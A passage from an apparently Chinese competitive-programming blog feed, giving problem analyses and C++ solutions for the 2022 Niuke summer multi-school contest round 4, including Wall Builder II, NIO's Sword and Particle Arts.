class="number">-1</span>][k]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;seed);</span><br><span class="line">    <span class="function">std::mt19937 <span class="title">rng</span><span class="params">(seed)</span></span>;</span><br><span class="line">    std::uniform_int_distribution&lt;&gt;<span class="built_in">u</span>(<span class="number">1</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">int</span> lastans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> qans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> IQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> EQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> AQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d %d\n&quot;,IQ,EQ,AQ);</span></span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i][IQ][EQ]&lt;=AQ)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lastans=ans;</span><br><span class="line">        qans+=lastans*<span class="built_in">qpow</span>(seed,m);</span><br><span class="line">        <span class="built_in">assert</span>(qans&gt;=<span class="number">0</span>);</span><br><span class="line">        qans%=MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,qans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;,qpow(2,591));</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Wall-Builder-II"><a href="#H-Wall-Builder-II" class="headerlink" title="H. Wall Builder II"></a>H. Wall Builder II</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题的话是赛时我和 sigma 都写出来了的题目。自己还交错几发亏了点罚时，因为没看到说一定要矩形，以为可以任意形状的。就是说给你高度为1的砖头，长度为 1 的有 $n$ 块，长度为 $2$ 的有 $n-1$ 块……长度为 $n$ 的有一块。</p><p>容易发现不管怎么放面积十肯定不会变的，那么就变成了我们以前聊到的话题：面积相同的情况下周长怎么最短。那就是长宽接近的时候，因为这题面积不大，所以我们直接 $sqrt$ 往后寻找最大的较小因数作为高度，然后面积/高得到宽度。因为砖头块高为 1，所以我们每一行每一行考虑，不难发现我们先放大的，最后放小的一定能放下。根据这个贪心策略我们就可以很容易写出这题，因为要按顺序输出方案，最后再把方案总结起来然后排个序输出即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];<span class="comment">//,b[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> num[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> line,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(length==<span class="number">0</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="built_in">min</span>(length,n);i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i])&#123;</span><br><span class="line">            q[line].<span class="built_in">push</span>(i);</span><br><span class="line">            num[i]--;</span><br><span class="line">            <span class="built_in">push</span>(line,length-i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y,x1,y1;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> pu&amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> (x1-x)&lt;(a.x1-a.x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;b[<span class="number">200005</span>]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=(n+<span class="number">1</span>-i)*i;</span><br><span class="line">        num[i]=n+<span class="number">1</span>-i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> width=<span class="number">0</span>,height=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,i,ans/i);</span><br><span class="line">            height=i;</span><br><span class="line">            width=ans/i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*<span class="number">2</span>+height*<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,height);</span></span><br><span class="line">        <span class="built_in">push</span>(i,width);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(q[i].<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> len=q[i].<span class="built_in">front</span>();</span><br><span class="line">            q[i].<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">//    printf(&quot;%d %d %d %d\n&quot;,);</span></span><br><span class="line">            b[++cnt]=&#123;start,i<span class="number">-1</span>,start+len,i&#125;;</span><br><span class="line">            start+=len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(b+<span class="number">1</span>,b+<span class="number">1</span>+cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=cnt;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,b[i].x,b[i].y,b[i].x1,b[i].y1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sigma的题目分析"><a href="#sigma的题目分析" class="headerlink" title="sigma的题目分析"></a>sigma的题目分析</h3><p>利用公式 $\frac{n * (n + 1) * (n + 2)}{6} $得到面积，当面积确定时，最接近 $sqrt(s)$ 的长宽为让周长最小的方案。将较长的边作为底边，按照长度从大到小枚举所有砖头的插入方案，倒序输出即可。</p><p>也贴一下sigma姐姐的<a href="https://blog.csdn.net/laysan/article/details/126077861?spm=1001.2014.3001.5501">博客链接</a></p><h3 id="sigma的标程"><a href="#sigma的标程" class="headerlink" title="sigma的标程"></a>sigma的标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> len[N];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x1, y1, x2, y2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vector&lt;node&gt; ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> s = n * (n + <span class="number">1</span>) * (n + <span class="number">2</span>) / <span class="number">6</span>;</span><br><span class="line">    ans.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;4&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;0 0 1 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="built_in">sqrt</span>(s); b &lt;= s; b++) &#123;</span><br><span class="line">        a = s / b;</span><br><span class="line">        <span class="keyword">if</span> (s % b == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="number">2</span> * (a + b) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= b; i++) &#123;</span><br><span class="line">        len[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b)</span><br><span class="line">        <span class="built_in">swap</span>(a, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;                <span class="comment">//当前块的长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n - i + <span class="number">1</span>; j++) &#123;    <span class="comment">//块数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> lie = <span class="number">1</span>; lie &lt;= a; lie++) &#123;  <span class="comment">//枚举每列</span></span><br><span class="line">                <span class="keyword">if</span> (b - len[lie] &gt;= i) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;len[lie], lie - <span class="number">1</span>, len[lie] + i, lie&#125;);</span><br><span class="line">                    len[lie] += i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = ans.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        cout &lt;&lt; ans[i].x1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ans[i].y1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ans[i].x2 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">             &lt;&lt; ans[i].y2 &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-NIO’s-Sword"><a href="#K-NIO’s-Sword" class="headerlink" title="K. NIO’s Sword"></a>K. NIO’s Sword</h2><p>sigma姐姐做出来的！</p><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>初始时攻击力为 $0$，每次可以任意在攻击力之后添加一个数字，仅有在攻击力模 $n$ 与 $i$ 同余时才能够击杀第 $i$ 个敌人，问需要的最少升级次数。</p><p>暴力跑结论公式即可，注意特判 $n=1$ 时的情况。</p><p>警惕开场 $10$ 分钟暴力猜结论输入什么输出什么，喜提罚时。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> now = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= N; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((i - (i - <span class="number">1</span>) * (now % n) % n) % n + n) % n &lt; now) &#123;</span><br><span class="line">                ans += j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            now = now * <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//     cin &gt;&gt; T;</span></span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="N-Particle-Arts"><a href="#N-Particle-Arts" class="headerlink" title="N. Particle Arts"></a>N. Particle Arts</h2><p>sigma姐姐做出来的！</p><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定一个数组 $n$，数组中的任意两个元素 $a,b$ 都可能产生碰撞，并形成两个新的元素 $a&amp;b$ 和 $a|b$ ，而原先的元素 $a,b$ 将消失。求若干次后该数组趋近的稳定方差是多少。</p><p>容易得到样例中最后得到的数组应为： $0\ 0\ 1\ 7\ 7$ ，即对于原数组中所有元素各位上的 $1$，都优先<strong>全部</strong>分配给稳定数组中的同一位。</p><p>采用方差公式：$\frac{n\times psum-sum\times sum}{n\times n}$</p><p>其中 $n$ 为样本数，$sum=\sum_{i=1}^{n}{x_i}$ ， $psum=\sum_{i=1}^{n}{x_i^2}$ 。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[N], b[N], cnt[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; a[i];</span><br><span class="line">        sum += a[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((a[i] &gt;&gt; j) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                cnt[j]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">15</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[j]) &#123;</span><br><span class="line">                b[i] += (<span class="number">1</span> &lt;&lt; j);</span><br><span class="line">                cnt[j]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> psum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        psum += b[i] * b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ans = n * psum - sum * sum;</span><br><span class="line">    <span class="keyword">int</span> ans2 = n * n;</span><br><span class="line">    <span class="keyword">if</span> (ans == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;0/1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> gg = __gcd(ans, ans2);</span><br><span class="line">    ans /= gg, ans2 /= gg;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; <span class="string">&quot;/&quot;</span> &lt;&lt; ans2 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// cin &gt;&gt; T;</span></span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>冲冲冲吧，今天还算不错的！</p><!--希望和sigma一起进步，越变越好-->]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 多校 </category>
          
          <category> 牛客 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>逆序对板子</title>
      <link href="/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/"/>
      <url>/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/</url>
      
